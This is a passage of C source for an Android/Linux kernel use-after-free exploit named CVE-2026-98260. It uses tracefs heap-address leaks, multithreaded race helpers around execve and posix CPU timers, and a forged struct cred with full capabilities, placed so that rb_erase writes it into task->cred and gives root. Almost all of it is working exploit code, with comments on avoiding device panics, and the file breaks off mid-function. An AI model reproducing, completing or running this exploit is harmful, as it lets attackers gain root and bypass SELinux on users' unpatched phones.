/*
 * CVE-2026-98260 UAF Exploit - standalone build
 *
 * Offsets come from kernel_table.c (compile-time values in kernel_offsets.h),
 * no runtime profile input.
 */

#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

// get offset table from kernel_table.c
#include "kernel_table.h"
#include "kernel_offsets.h"
#include "kprobe.h"
#include "oneplus_bypass_bridge.h"
#include "patch_json.h"

/* nezha 方法：KO_TIMER_ALLOC_PROBE_OFF != 0 时，timer victim 用 kprobe
 * do_timer_create+<off> 读 %x19，不再解析 raw trace 的 kmem_cache_alloc call_site/ptr。 */
static struct kprobe_session g_ksession;

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"
#define CPU0_TRACE TRACE "/per_cpu/cpu0/trace"
#define PAGE_OFFSET_DEFAULT UINT64_C(0xffffff7f80000000)
static uint64_t g_page_offset = PAGE_OFFSET_DEFAULT;

// runtime offset table (from kernel_table)
static uint64_t TIMER_LINK;
static uint64_t CRED_LINK;
static uint64_t SELINUX_LINK;
static uint64_t LINK_USER_NS;
static uint64_t LINK_ROOT_USER;
static uint64_t LINK_GROUPS;
static uint64_t LINK_UCOUNTS;
static uint32_t TASK_CRED;
static uint32_t TASK_STRUCT_SIZE;
static uint32_t KITIMER_NODE;
static uint64_t KITIMER_SIZE;
/* call-site of the task_struct slab allocation inside copy_process (0 = unknown) */
static uint64_t TASK_ALLOC_LINK;
/*
 * Forged-cred layout (B4): all offsets come from the profile (blob v4) so the
 * empty cred page matches whatever KMI the device runs. android15-8 values:
 *   size=184 uid@8 caps 48/56/64/72/80 security@128 user@136 ns@144 uc@152 grp@160
 * android13-8/android14-11 (5.15/6.1) are 8 bytes tighter: size=176 uid@4,
 * caps 40/48/56/64/72, security@120, user@128, ns@136, uc@144, grp@152.
 */
static uint32_t CRED_PLANT_SIZE;
static uint32_t CRED_UID_OFF;
static uint32_t CRED_OFF_CAP_INH, CRED_OFF_CAP_PERM, CRED_OFF_CAP_EFF;
static uint32_t CRED_OFF_CAP_BSET, CRED_OFF_CAP_AMB;
static uint32_t CRED_OFF_SELINUX, CRED_OFF_ROOT_USER;
static uint32_t CRED_OFF_USER_NS, CRED_OFF_UCOUNTS, CRED_OFF_GROUPS;

/*
 * ---- 伪造 cred 摆在哪儿：g_cred_split_node ----
 *
 * 1 = 分开摆：伪造 cred 放在 k_itimer 的 timerqueue_node 之后
 *     CVE98260_CRED_NODE_DELTA 字节处，两者不重叠。5.15 / 6.1 必须这样，
 *     因为它们的 cred->usage 只有 4 字节，cred 压在 node 上会把
 *     node->__rb_parent_color 高 32 位清零，rb_erase() 解出未映射地址后 panic。
 * 0 = 叠着摆：伪造 cred 直接覆盖 timerqueue_node 本身（旧布局），
 *     适用于 cred->usage 为 8 字节的 6.6 / 6.12 / 6.18。
 * -1 = 还没判（init_offsets 会按 profile 填 0/1）。
 *
 * 判据是 profile 的 cred_uid，即 offsetof(struct cred, uid)：uid 紧跟 usage，
 * 所以它的偏移就是 usage 的宽度 —— 4 选分开，8（或无法识别）选叠着。
 */
static int g_cred_split_node = -1;

static uint64_t g_slide = UINT64_C(0);
static int g_slide_given;
#define FULLCAP UINT64_C(0x1ffffffffff)

// initialize offset table (from kernel_table)
static int init_offsets(void) {
    const struct kernel_offsets *offsets = kernel_table_get();
    if (!offsets) {
        fprintf(stderr, "[config] error: kernel offset table not loaded\n");
        return -1;
    }
    
    TIMER_LINK = offsets->timer_link;
    CRED_LINK = offsets->cred_link;
    SELINUX_LINK = offsets->selinux_link;
    LINK_USER_NS = offsets->user_ns;
    LINK_ROOT_USER = offsets->root_user;
    LINK_GROUPS = offsets->groups;
    LINK_UCOUNTS = offsets->ucounts;
    TASK_CRED = offsets->task_cred;
    TASK_STRUCT_SIZE = offsets->task_struct_size;
    KITIMER_NODE = offsets->kitimer_node;
    KITIMER_SIZE = offsets->kitimer_size;
    TASK_ALLOC_LINK = offsets->task_alloc_link;
    g_page_offset = offsets->page_offset;

    /* forged-cred layout（profile blob v4；老 profile 已由 kernel_table.c 补 6.6 默认值） */
    CRED_PLANT_SIZE = offsets->cred_size;
    CRED_UID_OFF = offsets->cred_uid;
    CRED_OFF_CAP_INH = offsets->cred_cap_inh;
    CRED_OFF_CAP_PERM = offsets->cred_cap_perm;
    CRED_OFF_CAP_EFF = offsets->cred_cap_eff;
    CRED_OFF_CAP_BSET = offsets->cred_cap_bset;
    CRED_OFF_CAP_AMB = offsets->cred_cap_amb;
    CRED_OFF_SELINUX = offsets->cred_off_security;
    CRED_OFF_ROOT_USER = offsets->cred_off_user;
    CRED_OFF_USER_NS = offsets->cred_off_user_ns;
    CRED_OFF_UCOUNTS = offsets->cred_off_ucounts;
    CRED_OFF_GROUPS = offsets->cred_off_groups;

    /* cred->usage 只有 4 字节（5.15/6.1）时，伪造 cred 必须与 node 分开摆 */
    g_cred_split_node = (CRED_UID_OFF == 4);

    return 0;
}

/* 分开摆时要求 cred 完全落在 k_itimer 本体之外，否则内核对定时器对象尾部
 * （it.cpu.* 等）的写入会把伪造 cred 打坏。返回 0 可以，-1 profile/DELTA 不匹配。 */
static int cred_split_layout_ok(void)
{
	if (!g_cred_split_node)
		return 0;
	if ((uint64_t)KITIMER_NODE + CVE98260_CRED_NODE_DELTA < KITIMER_SIZE) {
		fprintf(stderr,
			"[config] error: CVE98260_CRED_NODE_DELTA %#x puts cred inside "
			"k_itimer (node=%#x size=%#" PRIx64 ")\n",
			(unsigned)CVE98260_CRED_NODE_DELTA, KITIMER_NODE, KITIMER_SIZE);
		return -1;
	}
	return 0;
}

static void print_cfg(void)
{
	dprintf(STDOUT_FILENO, "[config] PAGE=%#" PRIx64 " TIMER=%#" PRIx64 " CRED=%#" PRIx64 " SELINUX=%#" PRIx64 "\n",
		g_page_offset, TIMER_LINK, CRED_LINK, SELINUX_LINK);
	dprintf(STDOUT_FILENO,
		"[config] cred_layout=%s cred_uid=%u cred_size=%u kitimer_node=%#x kitimer_size=%#" PRIx64 "\n",
		g_cred_split_node ? "split" : "overlap", CRED_UID_OFF, CRED_PLANT_SIZE,
		KITIMER_NODE, KITIMER_SIZE);
	if (CRED_UID_OFF != 4 && CRED_UID_OFF != 8)
		dprintf(STDOUT_FILENO,
			"[config] warn: unexpected cred_uid=%u (want 4 or 8), using overlap\n",
			CRED_UID_OFF);
}

static uint64_t slide_addr(uint64_t link)
{
	return link + g_slide;
}
/* KITIMER_NODE is a runtime offset (see init_offsets); compile-time macro no longer used */
#define NFILL 42
#define MAX_RINGS 9000
#define NVMA 50000
#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif
#ifndef WNOWAIT
#define WNOWAIT 0x01000000
#endif

static _Atomic int g_go;
static _Atomic int g_stop;
static _Atomic int g_lockers;
static _Atomic int g_in_mprotect;
static _Atomic int g_exec_tid;
static _Atomic int g_mprotect_reported;
static void *g_vmas;
static size_t g_vmalen;

struct ipc {
	atomic_int phase;
	int helpers[4];
	int nhelpers;
};
static struct ipc *ipc;

static uint64_t g_all[2200];
static int g_all_n;
static uint64_t *g_ctx;
static int g_nrings;

static void on_alarm(int sig)
{
	(void)sig;
}

static int write_file_mode(const char *path, const char *text, int extra)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC | extra);
	ssize_t n;
	if (fd < 0)
		return -1;
	n = write(fd, text, strlen(text));
	close(fd);
	return n == (ssize_t)strlen(text) ? 0 : -1;
}

static int write_file(const char *path, const char *text)
{
	return write_file_mode(path, text, 0);
}

static int trigger_cmd(const char *text)
{
	if (!write_file(TRIGGER, text))
		return 0;
	return errno == EEXIST ? 0 : -1;
}

/*
 * Force the stage log down to the block device.
 *
 * A kernel panic (or a hard power loss) does not flush page cache: on 22:58 the
 * log ended mid-run and every byte after the last checkpoint came back as NUL,
 * which cost us the one piece of evidence that matters - which stage was
 * running when the device went down. fdatasync() on the inherited stdout makes
 * the probe durable. It is only called at stage boundaries, never inside the
 * reclaim/timer race windows, so it cannot perturb their timing.
 */
static void log_sync(void)
{
	(void)fdatasync(STDOUT_FILENO);
}

/*
 * 崩溃定位检查点（编译开关 CRASH_DEBUG_LOG，见 kernel_offsets.h）。
 *
 * log_sync() 只对“stdout 是普通文件”有效；panic 时页缓存尾巴仍可能整段丢失，
 * 而 pstore 在很多机器上是空的。这里单独开一个文件，每行 write + fdatasync，
 * 重启后 /data/local/tmp/skroot_cve98260.log 的最后一行就是死机点。
 *
 * 注意：fd 只在第一次调用（exploit 很早的阶段）打开并把首页写下去，之后都落在
 * 同一个页缓存页里，避免在 page_freed 之后为了写日志去 buddy 抢我们从 timer
 * slab 里刚放出来的那 4KB。总量限制在一页以内（<3900B），超了就不再写。
 *
 * CRASH_DEBUG_LOG=0 时整个实现被裁掉，所有 crash_log(...) 调用点编译成空语句。
 */
#if CRASH_DEBUG_LOG
#define CRASH_LOG_PATH "/data/local/tmp/skroot_cve98260.log"
static int g_crash_log_fd = -1;
static unsigned g_crash_log_bytes;
static void crash_log(const char *fmt, ...) {
	char buf[192];
	va_list ap;
	int n;

	if (g_crash_log_fd < 0) {
		g_crash_log_fd = open(CRASH_LOG_PATH, O_WRONLY | O_CREAT | O_TRUNC | O_APPEND | O_CLOEXEC, 0666);
		if (g_crash_log_fd < 0)
			return;
	}
	if (g_crash_log_bytes > 3900)
		return;
	va_start(ap, fmt);
	n = vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	if (n <= 0)
		return;
	if (n > (int)sizeof(buf) - 1)
		n = (int)sizeof(buf) - 1;
	(void)!write(g_crash_log_fd, buf, (size_t)n);
	(void)fdatasync(g_crash_log_fd);
	g_crash_log_bytes += (unsigned)n;
}
#else
#define crash_log(...) do { } while (0)
#endif

static int kick_rss(void)
{
	unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n"))
		return -1;
	if (page != MAP_FAILED) {
		((volatile unsigned char *)page)[0] = 1;
		munmap(page, 4096);
	}
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
	return 0;
}

/*
 * Deterministic arm / disarm of kmem:kmem_cache_alloc.
 *
 * The reference implementation arms the event *indirectly*: it attaches
 * "enable_event:kmem:kmem_cache_alloc" to the kmem/rss_stat trigger, then kicks
 * rss_stat by touching a single anonymous page (kick_rss above). Whether that
 * actually arms the event depends on the per-task RSS counter crossing
 * TASK_RSS_EVENTS_THRESH -- one 4KiB touch only advances that counter by 1, so
 * on kernels/ROMs whose counter happens to sit far below the threshold the
 * trigger never fires and kmem_cache_alloc stays disabled for good.
 *
 * That is harmless for calib_a (the timer probe keeps bumping RSS thousands of
 * times afterwards, so the trigger fires sooner or later) but fatal for the
 * short-lived captures: leak_task() arms, forks once, and reads the
 * buffer immediately -- no further RSS growth, so if the trigger missed there
 * are zero kmem_cache_alloc records in the buffer. Observed reproducibly on
 * Xiaomi 2510DRK44C / M332BF, kernel 6.6.118-android15-8-g0908354dac1b:
 *     [task] hits=0 foreign=0 task=0
 *     [task] leak failed
 * (foreign==0 is the tell-tale: not "wrong pid", literally no record matched
 * the size filter, because no record was emitted at all.)
 *
 * Fix: enable the event directly. The trigger path is kept as a fallback for
 * ROMs that refuse the direct write.
 */
/*
 * Read events/kmem/kmem_cache_alloc/enable back and log it. A successful write()
 * to a tracefs event file is not proof that the event is live (it can stay
 * soft-disabled), and the only evidence we otherwise get is "hits=0", which is
 * indistinguishable from "no record of that size". Printing the mode plus the
 * read-back value makes the next failing log self-explanatory.
 */
static void report_arm(const char *mode)
{
	static const char path[] = TRACE "/events/kmem/kmem_cache_alloc/enable";
	char v[8] = "?";
	int fd = open(path, O_RDONLY | O_CLOEXEC);

	if (fd >= 0) {
		if (read(fd, v, sizeof(v) - 1) <= 0)
			v[0] = '?';
		close(fd);
	}
	v[strcspn(v, "\r\n")] = '\0';
	dprintf(STDOUT_FILENO, "[trace] kmem_cache_alloc armed=%s enable=%s\n",
		mode, v);
}

static int arm_kmem_cache_alloc(void)
{
	if (!write_file(TRACE "/events/kmem/kmem_cache_alloc/enable", "1\n")) {
		report_arm("direct");
		return 0;
	}
	if (!trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") && !kick_rss()) {
		report_arm("trigger");
		return 0;
	}
	dprintf(STDOUT_FILENO,
		"[trace] kmem_cache_alloc arm failed errno=%d (direct+trigger)\n",
		errno);
	return -1;
}

static void disarm_kmem_cache_alloc(void)
{
	write_file(TRACE "/events/kmem/kmem_cache_alloc/enable", "0\n");
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
}

static void disarm(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static void quiet_reclaim_trace(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:mm_page_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_alloc\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static int trace_off_on(void)
{
	if (write_file(TRACE "/tracing_on", "0\n") ||
	    write_file_mode(TRACE "/trace", "", O_TRUNC))
		return -1;
	return write_file(TRACE "/tracing_on", "1\n");
}

static uint64_t object_pfn(uint64_t ptr)
{
	return ((ptr & ~UINT64_C(0xfff)) - g_page_offset) >> 12;
}

static int cpu_count(void);

static int pfn_in_line(const char *line, uint64_t pfn)
{
	const char *p = strstr(line, "pfn=0x");
	char *end = NULL;
	uint64_t got;
	if (!p)
		return 0;
	got = strtoull(p + 6, &end, 16);
	if (end == p + 6)
		return 0;
	return got == pfn;
}

static int trace_seen(const char *kind, uint64_t pfn)
{
	int ncpu = cpu_count();
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			if (strstr(line, kind) && pfn_in_line(line, pfn)) {
				fclose(file);
				return 1;
			}
		}
		fclose(file);
	}
	return 0;
}

static int cpu_count(void)
{
	char buf[128];
	char *p;
	int fd, n = 0;
	ssize_t got;
	memset(buf, 0, sizeof(buf));
	fd = open("/sys/devices/system/cpu/present", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return 8;
	got = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (got <= 0)
		return 8;
	for (p = buf; *p; ) {
		int v = 0;
		if (*p < '0' || *p > '9') {
			p++;
			continue;
		}
		while (*p >= '0' && *p <= '9')
			v = v * 10 + (*p++ - '0');
		if (v + 1 > n)
			n = v + 1;
	}
	if (n < 1)
		return 8;
	return n > 16 ? 16 : n;
}

static int pin_cpu(int cpu)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	return sched_setaffinity(0, sizeof(set), &set);
}

/*
 * E3：raw trace 缓冲区跨函数复用。
 *
 * collect_nth / leak_task 在同一轮里先后读取 per-CPU raw trace，
 * 原先各自 malloc(4~8MB) 再 free，反复申请/归还大块内存：既扩大了 malloc 失败面
 * （见 E2），也在内存压力时产生额外抖动。
 * 统一用一块按需增长的全局缓冲，首次按需 realloc，之后复用。
 *
 * 约束：调用方不得跨调用持有返回指针，且不得重入。当前调用链全部在 main 线程
 * 串行执行（leak_task → collect_nth），彼此不嵌套，满足该约束。
 */
static uint8_t *g_rawbuf;static size_t g_rawcap;

static uint8_t *raw_buf(size_t need)
{
	uint8_t *p;
	if (g_rawcap >= need)
		return g_rawbuf;
	p = realloc(g_rawbuf, need);
	if (!p) {
		dprintf(STDOUT_FILENO, "[raw] grow to %zu failed (cap=%zu)\n", need, g_rawcap);
		return NULL;
	}
	g_rawbuf = p;
	g_rawcap = need;
	return g_rawbuf;
}

static int collect_nth(int index, int *count, uint64_t *chosen)
{
	/* E3：复用全局 raw 缓冲（不再每次 malloc 8MB） */
	uint8_t *buf = raw_buf(8U << 20);
	size_t used = 0;
	uint8_t needle[8];
	uint64_t site = slide_addr(TIMER_LINK);
	int fd, n = 0;
	if (!buf)
		return -1;
	memcpy(needle, &site, 8);
	*chosen = 0;
	fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	alarm(2);
	while (used + 4096 < (8U << 20)) {
		ssize_t got = read(fd, buf + used, (8U << 20) - used);
		if (got <= 0)
			break;
		used += (size_t)got;
	}
	alarm(0);
	close(fd);
	/* B2 修复：needle 即 site（TIMER_LINK 的 slide 地址），memcmp 已保证
	 * buf+i..i+8 与 needle 相等，再比较 got(=buf+i) 与 site 恒为真，属死代码。
	 * 真正过滤只看 req（k_itimer 大小）与 ptr（内核地址特征），故删除 got。 */
	for (size_t i = 0; i + 32 <= used; i++) {
		uint64_t ptr, req;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&req, buf + i + 24, 8);
		if (req != 0x108 || (ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		if (n < (int)(sizeof(g_all) / sizeof(g_all[0])))
			g_all[n] = ptr;
		*chosen = (n == index) ? ptr : *chosen;
		n++;
	}
	/* E3：缓冲由 raw_buf 持有，不在此释放 */
	*count = n;
	g_all_n = n;
	dprintf(STDOUT_FILENO, "[uaf] captured=%d chosen=%#" PRIx64 " raw=%zu\n",
		n, *chosen, used);
	return (n > index && *chosen) ? 0 : -1;
}

static int prepare_vmas(void)
{
	long page = 4096;
	int fd = (int)syscall(SYS_memfd_create, "v", MFD_CLOEXEC);
	void *base;
	if (fd < 0 || ftruncate(fd, page))
		return -1;
	g_vmalen = (size_t)NVMA * (size_t)page;
	base = mmap(NULL, g_vmalen, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (base == MAP_FAILED)
		return -1;
	for (int i = 0; i < NVMA; i++) {
		void *at = (char *)base + (size_t)i * (size_t)page;
		if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != at)
			return -1;
	}
	close(fd);
	g_vmas = base;
	return 0;
}

#define HELPER_STACK (1 << 20)

static int spawn_helper(int (*fn)(void *), void *arg)
{
	void *stack = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
	int pid;
	if (stack == MAP_FAILED)
		return -1;
	pid = clone(fn, (char *)stack + HELPER_STACK, CLONE_VM | SIGCHLD, arg);
	return pid;
}

static int locker_fn(void *arg)
{
	int prot = PROT_NONE;
	(void)arg;
	while (!atomic_load_explicit(&g_go, memory_order_acquire)) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	atomic_fetch_add_explicit(&g_lockers, 1, memory_order_release);
	while (!atomic_load_explicit(&g_stop, memory_order_acquire)) {
		int rc;
		atomic_store_explicit(&g_in_mprotect, 1, memory_order_release);
		rc = mprotect(g_vmas, g_vmalen, prot);
		atomic_store_explicit(&g_in_mprotect, 0, memory_order_release);
		if (rc && atomic_exchange_explicit(&g_mprotect_reported, 1, memory_order_relaxed) == 0)
			dprintf(STDOUT_FILENO, "[locker] mprotect errno=%d\n", errno);
		prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
	}
	return 0;
}

static int killer_fn(void *arg)
{
	int tgid = (int)(intptr_t)arg;
	int old;
	while (!(old = atomic_load_explicit(&g_exec_tid, memory_order_acquire))) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	for (;;) {
		if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH)
			break;
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
	}
	syscall(SYS_tgkill, tgid, tgid, SIGKILL);
	dprintf(STDOUT_FILENO, "[killer] SIGKILL tgid=%d old=%d errno=%d\n",
		tgid, old, errno);
	return 0;
}

static void *exec_fn(void *arg)
{
	struct sigevent event;
	struct itimerspec spec;
	char *argv[] = { (char *)"uaf_plant", (char *)"--exec-ok", NULL };
	(void)arg;
	struct sigevent armed_event;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	memset(&armed_event, 0, sizeof(armed_event));
	armed_event.sigev_notify = SIGEV_SIGNAL;
	armed_event.sigev_signo = SIGRTMIN;
	memset(&spec, 0, sizeof(spec));
	spec.it_value.tv_sec = 3600;
	if (pin_cpu(0))
		_exit(116);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 2) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(124);
		sched_yield();
	}
	timer_t armed;
	int made = 0;
	for (int i = 0; i < 2048; i++) {
		timer_t extra;
		if (timer_create(CLOCK_THREAD_CPUTIME_ID,
				 i == 1024 ? &armed_event : &event, &extra))
			_exit(120);
		if (i == 1024) {
			armed = extra;
			if (timer_settime(armed, 0, &spec, NULL))
				_exit(120);
		}
		made++;
	}
	if (made < 2048)
		_exit(120);
	atomic_store_explicit(&g_exec_tid, (int)syscall(SYS_gettid), memory_order_release);
	atomic_store_explicit(&ipc->phase, 3, memory_order_release);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 4) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(125);
		sched_yield();
	}
	atomic_store_explicit(&g_go, 1, memory_order_release);
	while (atomic_load_explicit(&g_in_mprotect, memory_order_acquire) == 0) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(123);
		sched_yield();
	}
	dprintf(STDOUT_FILENO, "[exec_body] begin tid=%ld\n", (long)syscall(SYS_gettid));
	execve("/proc/self/exe", argv, NULL);
	_exit(122);
}

static int child_race(void)
{
	pthread_t exec_thread;
	sigset_t block;
	int tgid = (int)getpid();
	sigemptyset(&block);
	sigaddset(&block, SIGRTMIN);
	sigprocmask(SIG_BLOCK, &block, NULL);
	if (prepare_vmas())
		_exit(110);
	dprintf(STDOUT_FILENO, "[race_child] vmas ready pid=%d\n", getpid());
	if (pin_cpu(1))
		_exit(115);
	for (int i = 0; i < 3; i++) {
		int pid = spawn_helper(locker_fn, NULL);
		if (pid < 0)
			_exit(111);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	{
		int pid = spawn_helper(killer_fn, (void *)(intptr_t)tgid);
		if (pid < 0)
			_exit(112);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	if (pthread_create(&exec_thread, NULL, exec_fn, NULL))
		_exit(114);
	atomic_store_explicit(&ipc->phase, 1, memory_order_release);
	for (;;)
		pause();
}

static int wait_phase(int want)
{
	for (int i = 0; i < 600; i++) {
		struct timespec pause = { .tv_nsec = 50000000 };
		if (atomic_load_explicit(&ipc->phase, memory_order_acquire) >= want)
			return 0;
		nanosleep(&pause, NULL);
	}
	return -1;
}

static void stop_helpers(void)
{
	if (!ipc)
		return;
	for (int i = 0; i < ipc->nhelpers && i < 4; i++) {
		if (ipc->helpers[i] > 0)
			kill(ipc->helpers[i], SIGKILL);
	}
}
static int wait_zombie(pid_t child, int *status_out)
{
	for (int i = 0; i < 400; i++) {
		siginfo_t info;
		struct timespec pause = { .tv_nsec = 50000000 };
		memset(&info, 0, sizeof(info));
		if (waitid(P_PID, (id_t)child, &info, WEXITED | WNOHANG | WNOWAIT))
			return -1;
		if (info.si_pid == child) {
			*status_out = info.si_status;
			return info.si_code;
		}
		nanosleep(&pause, NULL);
	}
	return 0;
}

#define MAX_CPU 16
#define PER_CPU_RINGS 512
static uint64_t g_cpu_ctx[MAX_CPU][PER_CPU_RINGS];
static int g_cpu_n[MAX_CPU];

static void destroy_rings(void)
{
	for (int cpu = 0; cpu < MAX_CPU; cpu++) {
		for (int i = 0; i < g_cpu_n[cpu]; i++)
			syscall(SYS_io_destroy, g_cpu_ctx[cpu][i]);
		g_cpu_n[cpu] = 0;
	}
	g_nrings = 0;
}

static unsigned long *g_hold;
static int g_nhold;

static void free_aio_hold(void)
{
	for (int i = 0; i < g_nhold; i++)
		syscall(SYS_io_destroy, g_hold[i]);
	g_nhold = 0;
	free(g_hold);
	g_hold = NULL;
}
static int g_stream[4][2];
static int g_nstream;
static unsigned g_shift;
static uint64_t g_task;
static uint64_t g_cred_kva;
static int g_plant_cred;
static int g_wake[2] = { -1, -1 };
static int g_report[2] = { -1, -1 };
static pid_t g_cred_child_pid = -1;

static void close_stream(void)
{
	for (int i = 0; i < g_nstream; i++) {
		if (g_stream[i][0] >= 0)
			close(g_stream[i][0]);
		if (g_stream[i][1] >= 0)
			close(g_stream[i][1]);
		g_stream[i][0] = g_stream[i][1] = -1;
	}
	g_nstream = 0;
}

static int g_fast;

/*
 * Forged-cred field offsets are profile-driven (blob v4, see the statics at
 * the top of this file and init_offsets()). That closes review item B4: a KMI
 * shift now only means regenerating the profile from the device's boot.img
 * (BTF gives the real struct cred layout), no C change is needed.
 */

/*
 * R1：从 reclaim_stream 抽出的「构造 8KB 灌入模式」。
 *
 * 两种形态（由 g_plant_cred 决定）：
 *   g_plant_cred=1  摆一份伪造 cred，字段偏移用 CRED_OFF_*（见 B4）：
 *                     g_cred_split_node=1 -> cred 在 node_off + DELTA，
 *                     node 自身写成自洽 rb_node（5.15/6.1，usage 4 字节）；
 *                     g_cred_split_node=0 -> 旧行为，cred 直接覆盖 node
 *                     （6.6+，usage 8 字节）。
 *   g_plant_cred=0  以 24 字节步长铺 k_itimer 的 rb_node，让悬挂节点指向 target。
 * 返回 0 成功；-1 表示该页布局放不下（已打印原因）。
 */
static int build_stream_pattern(unsigned char *pat, unsigned node_off,
				uint64_t base, uint64_t target, uint64_t victim)
{
	if (g_plant_cred) {
		uint64_t page = g_page_offset + (base << 12);
		uint64_t node_kva = victim + KITIMER_NODE;
		if (g_cred_split_node) {
			/*
			 * 5.15/6.1：struct cred 的 usage 只有 4 字节（uid@4）。cred 若压在
			 * timerqueue_node 上，node->__rb_parent_color 的高 32 位会被 memset 成 0，
			 * 得到 0x00000000<low32(node_kva)> —— 一个未映射的用户地址。
			 * rb_erase()/rb_next() 取 parent 时解它 -> Oops -> panic_on_oops，
			 * 现象就是 [stream_backfill] page_freed=1 之后设备立刻死机。
			 * 而且这条路径从来不会写 rb_left，也就永远装不上 cred。
			 *
			 * 改成把 cred 挪到 node 之后 CVE98260_CRED_NODE_DELTA，两者不重叠：
			 *   node[0x00] = cred 地址（可解、且 != node，能过 RB_EMPTY_NODE 检查）
			 *   node[0x08] = NULL            -> __rb_right
			 *   node[0x10] = &task->cred     -> __rb_left，rb_erase 的
			 *                                   tmp->__rb_parent_color = pc
			 *                                   正是把 pc(=cred 地址) 写进 task->cred
			 *
			 * 但真正决定生死的是收尾：页被回收之后，最后一个线程被 waitpid()
			 * 回收时 __exit_signal(group_dead) -> posix_cpu_timers_exit_group()
			 * 会跑一个
			 *     while (rb_leftmost) { timerqueue_del(head, node);
			 *                           node->base = 0; }
			 * 循环，而 timerqueue_del 里 rb_leftmost = rb_next(node)。
			 * rb_next 只在 parent 链走空时返回 NULL，所以必须让这趟攀爬在
			 * cred 这里收尾：
			 *   rb_next(node): parent = cred(=node->__rb_parent_color)
			 *                  node == cred->rb_right ? -> node = cred
			 *                  rb_parent(cred) == NULL  -> 返回 NULL
			 * 即：
			 *   cred+0x00 (usage) <= 3        -> rb_parent(cred) = usage & ~3 = 0
			 *   cred+0x08                     = node 地址 -> 让攀爬走到 cred
			 * 少了这一步，rb_leftmost 会变成 cred 地址，下一轮把 cred 当 rb_node 用，
			 * 还会把 pc 写进 &task->cred（变成 2），当场 panic。
			 * cred+0x08 里那个 node 地址随后由 __rb_change_child 覆盖成 &task->cred，
			 * 再由 one_uaf(g_cred_kva + 8) 的零写清成 gid/suid = 0（见 uaf_plant_main）。
			 */
			unsigned cred_off = node_off + CVE98260_CRED_NODE_DELTA;
			uint64_t cred_kva = node_kva + CVE98260_CRED_NODE_DELTA;
			unsigned blob = cred_off >= 0x40 ? 0 : 0x1f00;
			uint64_t *cred;
			if (cred_off + CRED_PLANT_SIZE > 8192 || blob + 32 > 8192 ||
			    page + node_off != node_kva) {
